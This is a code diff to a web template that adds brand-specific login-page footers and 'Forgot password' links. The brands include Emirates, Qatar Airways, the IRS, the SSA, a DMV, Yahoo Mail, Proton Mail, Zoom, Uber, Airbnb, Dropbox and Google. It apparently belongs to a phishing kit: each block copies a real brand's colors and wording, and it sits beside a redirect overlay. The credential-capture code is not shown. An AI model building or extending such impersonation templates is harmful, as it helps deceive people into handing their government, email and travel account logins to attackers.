@@ -2176,6 +2176,65 @@
     <a href="#" class="tz-forgot" onclick="return false">Forgot password?</a>
     <div class="tz-footer">No account yet? <a href="#" onclick="return false">Create account</a></div>
   <% } %>
+  <% if (tpl.key === 'emirates') { %>
+    <style>body.brand-emirates .em-forgot{display:block;text-align:center;font-size:.82rem;color:#C8102E;margin-top:10px;text-decoration:none}body.brand-emirates .em-footer{margin-top:14px;padding-top:12px;border-top:1px solid #eee;font-size:.78rem;color:#666;text-align:center}body.brand-emirates .em-footer a{color:#C8102E}</style>
+    <a href="#" class="em-forgot" onclick="return false">Forgot your password?</a>
+    <div class="em-footer">New to Emirates? <a href="#" onclick="return false">Join Skywards</a></div>
+  <% } %>
+  <% if (tpl.key === 'qatarairways') { %>
+    <style>body.brand-qatarairways .qa-forgot{display:block;text-align:center;font-size:.82rem;color:#5C0632;margin-top:10px;text-decoration:none}body.brand-qatarairways .qa-footer{margin-top:14px;padding-top:12px;border-top:1px solid #eee;font-size:.78rem;color:#666;text-align:center}body.brand-qatarairways .qa-footer a{color:#5C0632}body.brand-qatarairways h1{color:#5C0632;font-weight:700}</style>
+    <a href="#" class="qa-forgot" onclick="return false">Forgot your password?</a>
+    <div class="qa-footer">Not a member? <a href="#" onclick="return false">Join Privilege Club</a></div>
+  <% } %>
+  <% if (tpl.key === 'irs') { %>
+    <style>body.brand-irs .irs-forgot{display:block;text-align:center;font-size:.82rem;color:#003366;margin-top:10px;text-decoration:none}body.brand-irs .irs-footer{margin-top:14px;padding-top:12px;border-top:1px solid #ddd;font-size:.78rem;color:#555;text-align:center}body.brand-irs .irs-footer a{color:#003366}</style>
+    <a href="#" class="irs-forgot" onclick="return false">Forgot your username or password?</a>
+    <div class="irs-footer">Need help? <a href="#" onclick="return false">Contact the IRS</a></div>
+  <% } %>
+  <% if (tpl.key === 'ssa') { %>
+    <style>body.brand-ssa .ssa-forgot{display:block;text-align:right;font-size:.8rem;color:#0066CC;margin:-4px 0 8px;text-decoration:none}body.brand-ssa .ssa-footer{margin-top:14px;padding-top:12px;border-top:1px solid #ddd;font-size:.78rem;color:#555;text-align:center}body.brand-ssa .ssa-footer a{color:#0066CC}</style>
+    <a href="#" class="ssa-forgot" onclick="return false">Forgot username or password?</a>
+    <div class="ssa-footer">Don't have an account? <a href="#" onclick="return false">Create an account</a></div>
+  <% } %>
+  <% if (tpl.key === 'dmv') { %>
+    <style>body.brand-dmv .dmv-forgot{display:block;text-align:center;font-size:.82rem;color:#1B3A6B;margin-top:10px;text-decoration:none}body.brand-dmv .dmv-footer{margin-top:14px;font-size:.78rem;color:#666;text-align:center}body.brand-dmv .dmv-footer a{color:#1B3A6B}</style>
+    <a href="#" class="dmv-forgot" onclick="return false">Forgot your password?</a>
+    <div class="dmv-footer">First time? <a href="#" onclick="return false">Create an account</a></div>
+  <% } %>
+  <% if (tpl.key === 'yahoomail') { %>
+    <style>body.brand-yahoomail .yh-forgot{display:block;text-align:center;font-size:.82rem;color:#6001D2;margin-top:10px;text-decoration:none}body.brand-yahoomail .yh-footer{margin-top:14px;padding-top:12px;border-top:1px solid #eee;font-size:.78rem;color:#666;text-align:center}body.brand-yahoomail .yh-footer a{color:#6001D2}</style>
+    <a href="#" class="yh-forgot" onclick="return false">Forgot password?</a>
+    <div class="yh-footer">Don't have an account? <a href="#" onclick="return false">Create account</a></div>
+  <% } %>
+  <% if (tpl.key === 'protonmail') { %>
+    <style>body.brand-protonmail .pm-forgot{display:block;text-align:center;font-size:.82rem;color:#8B7CF6;margin-top:10px;text-decoration:none}body.brand-protonmail .pm-footer{margin-top:14px;padding-top:12px;border-top:1px solid #3A3880;font-size:.78rem;color:#aaa;text-align:center}body.brand-protonmail .pm-footer a{color:#8B7CF6}</style>
+    <a href="#" class="pm-forgot" onclick="return false">Forgot your password?</a>
+    <div class="pm-footer">New to Proton? <a href="#" onclick="return false">Create a free account</a></div>
+  <% } %>
+  <% if (tpl.key === 'zoom') { %>
+    <style>body.brand-zoom .zm-forgot{display:block;text-align:center;font-size:.82rem;color:#0B5CFF;margin-top:10px;text-decoration:none}body.brand-zoom .zm-footer{margin-top:14px;padding-top:12px;border-top:1px solid #eee;font-size:.78rem;color:#666;text-align:center}body.brand-zoom .zm-footer a{color:#0B5CFF}</style>
+    <a href="#" class="zm-forgot" onclick="return false">Forgot password?</a>
+    <div class="zm-footer">Don't have an account? <a href="#" onclick="return false">Sign up free</a></div>
+  <% } %>
+  <% if (tpl.key === 'uber') { %>
+    <style>body.brand-uber .ub-forgot{display:block;text-align:center;font-size:.82rem;color:#aaa;margin-top:10px;text-decoration:none}body.brand-uber .ub-footer{margin-top:14px;padding-top:12px;border-top:1px solid #333;font-size:.78rem;color:#888;text-align:center}body.brand-uber .ub-footer a{color:#aaa}</style>
+    <a href="#" class="ub-forgot" onclick="return false">Forgot your password?</a>
+    <div class="ub-footer">Don't have an account? <a href="#" onclick="return false">Sign up</a></div>
+  <% } %>
+  <% if (tpl.key === 'airbnb') { %>
+    <style>body.brand-airbnb .ab-forgot{display:block;text-align:center;font-size:.82rem;color:#FF5A5F;margin-top:10px;text-decoration:none}body.brand-airbnb .ab-footer{margin-top:14px;padding-top:12px;border-top:1px solid #eee;font-size:.78rem;color:#666;text-align:center}body.brand-airbnb .ab-footer a{color:#FF5A5F}</style>
+    <a href="#" class="ab-forgot" onclick="return false">Forgot your password?</a>
+    <div class="ab-footer">Don't have an account? <a href="#" onclick="return false">Sign up</a></div>
+  <% } %>
+  <% if (tpl.key === 'dropbox') { %>
+    <style>body.brand-dropbox .db-forgot{display:block;text-align:center;font-size:.82rem;color:#0061FF;margin-top:10px;text-decoration:none}body.brand-dropbox .db-footer{margin-top:14px;padding-top:12px;border-top:1px solid #eee;font-size:.78rem;color:#666;text-align:center}body.brand-dropbox .db-footer a{color:#0061FF}</style>
+    <a href="#" class="db-forgot" onclick="return false">Forgot your password?</a>
+    <div class="db-footer">Don't have an account? <a href="#" onclick="return false">Create a free account</a></div>
+  <% } %>
+  <% if (tpl.key === 'google') { %>
+    <style>body.brand-google .gg-footer{margin-top:14px;padding-top:12px;border-top:1px solid #e8eaed;font-size:.78rem;color:#5f6368;text-align:center}body.brand-google .gg-footer a{color:#1a73e8}</style>
+    <div class="gg-footer">Not your computer? <a href="#" onclick="return false">Use a private browsing window</a> to sign in. <a href="#" onclick="return false">Learn more</a></div>
+  <% } %>
 </div>
 
 <!-- ── Animated redirect overlay ──────────────────────────── -->
